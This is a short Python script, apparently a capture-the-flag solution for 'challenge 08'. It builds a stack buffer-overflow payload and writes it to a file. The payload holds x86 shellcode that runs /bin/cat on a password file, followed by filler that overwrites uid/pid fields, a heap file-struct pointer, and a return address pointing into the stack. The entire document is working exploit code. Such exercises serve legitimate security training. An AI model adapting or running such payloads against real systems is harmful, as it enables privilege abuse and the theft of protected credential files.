import struct

# custom shellcode from challenge 08 (catpw.s)
shellcode = b'j\x0bX1\xd2RhsswdhA.pa\x8dL$\x01Rh/cath/bin\x89\xe3RQS\x89\xe1\xcd\x80'
# end of stack mapping ("info proc map" in gdb)
stack_region_end = 0xc0000000

s = b'USERNAME='
s += shellcode.ljust(128, b'\xcc')

# overwrites uid/pid
s += b'AAAABBBB'

# file struct ptr (ptr to heap)
s += struct.pack("<I", 0x0804b160)

# other stack stuff
s += b'CCCCDDDDEEEEFFFFGGGGHHHHIIII'

# ret ptr
s += struct.pack("<I", stack_region_end - 140)

# mov dest (beginning of stack)
s += struct.pack("<I", stack_region_end - 140)

with open('data', 'wb') as f:
    f.write(s)
print(s)